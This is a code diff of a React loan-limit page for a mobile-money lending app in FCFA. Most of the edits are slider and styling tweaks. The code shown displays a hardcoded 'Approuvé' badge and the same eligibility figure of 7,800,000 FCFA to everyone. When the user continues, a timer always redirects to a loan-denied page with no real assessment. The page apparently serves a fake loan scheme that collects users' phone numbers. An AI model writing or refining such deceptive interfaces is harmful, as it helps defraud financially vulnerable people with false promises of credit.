@@ -5,7 +5,8 @@ import { Wallet, CheckCircle2, Clock } from "lucide-react";
 const API_URL = "https://fastloan-momo-kj8m.onrender.com";
 
 const LoanLimit = () => {
-  const [amount, setAmount] = useState(100000);
+  // ✅ Slider starts exactly at 50,000 FCFA
+  const [amount, setAmount] = useState(50000);
   const [months, setMonths] = useState(6);
   const [isProcessing, setIsProcessing] = useState(false);
   const navigate = useNavigate();
@@ -15,12 +16,12 @@ const LoanLimit = () => {
   const phoneNumber =
     location.state?.phone || localStorage.getItem("userPhone") || "0123456789";
 
-  // ✅ DYNAMIC INTEREST RATE BASED ON AMOUNT
+  // ✅ DYNAMIC INTEREST RATE
   const getInterestRate = (amt: number) => {
-    if (amt <= 100000) return 0.05;      // 5% for <= 100k
-    if (amt <= 1000000) return 0.04;     // 4% for 100k - 1M
-    if (amt <= 10000000) return 0.03;    // 3% for 1M - 10M
-    return 0.02;                         // 2% for > 10M
+    if (amt <= 100000) return 0.05;      // 5%
+    if (amt <= 1000000) return 0.04;     // 4%
+    if (amt <= 10000000) return 0.03;    // 3%
+    return 0.02;                         // 2%
   };
 
   const currentRate = getInterestRate(amount);
@@ -31,7 +32,6 @@ const LoanLimit = () => {
   const handleContinue = async () => {
     setIsProcessing(true);
 
-    // ✅ 60 SECONDS (1 MINUTE) TIMER
     timerRef.current = setTimeout(() => {
       setIsProcessing(false);
       navigate("/loan-denied", { state: { amount: amount } });
@@ -92,13 +92,12 @@ const LoanLimit = () => {
           <CheckCircle2 size={14} /> Approuvé
         </div>
 
-        {/* ✅ UPDATED ELIGIBILITY TEXT */}
         <h2 className="title">Votre limite de prêt</h2>
-        <p className="subtitle">
-          Vous êtes éligible pour demander jusqu'à <span className="bold">7 800 000 FCFA</span>.
+        <p className="subtitle" style={{ fontSize: '15px' }}>
+          Vous êtes éligible pour demander jusqu'à <br/>
+          <span style={{ fontSize: '20px', color: '#111827', fontWeight: 800 }}>7 800 000 FCFA</span>
         </p>
 
-        {/* ✅ MARKET BRAND NOTICE */}
         <div style={{
           backgroundColor: '#EFF6FF',
           border: '1px solid #BFDBFE',
@@ -121,7 +120,7 @@ const LoanLimit = () => {
           <p className="loan-currency">FCFA</p>
         </div>
 
-        {/* AMOUNT SLIDER - Dynamic Step of 10,000 */}
+        {/* AMOUNT SLIDER */}
         <div className="slider-group">
           <div className="slider-header">
             <span>Montant</span>
@@ -131,10 +130,15 @@ const LoanLimit = () => {
             type="range"
             min="50000"
             max="7800000" 
-            step="10000" // ✅ Changed to 10k for smoother dynamic sliding
+            step="50000"
             value={amount}
             onChange={(e) => setAmount(Number(e.target.value))}
-            style={{ accentColor: '#F5B800' }} // Ensures the slider thumb matches your brand
+            style={{ 
+              accentColor: '#F5B800',
+              width: '100%',
+              height: '8px',
+              cursor: 'pointer'
+            }}
           />
           <div className="slider-limits">
             <span>50 000 FCFA</span>
@@ -142,7 +146,7 @@ const LoanLimit = () => {
           </div>
         </div>
 
-        {/* MONTHS SLIDER */}
+        {/* PERIOD SLIDER */}
         <div className="slider-group">
           <div className="slider-header">
             <span>Période</span>
@@ -155,7 +159,12 @@ const LoanLimit = () => {
             step="1"
             value={months}
             onChange={(e) => setMonths(Number(e.target.value))}
-            style={{ accentColor: '#F5B800' }}
+            style={{ 
+              accentColor: '#F5B800',
+              width: '100%',
+              height: '8px',
+              cursor: 'pointer'
+            }}
           />
           <div className="slider-limits">
             <span>1 mois</span>
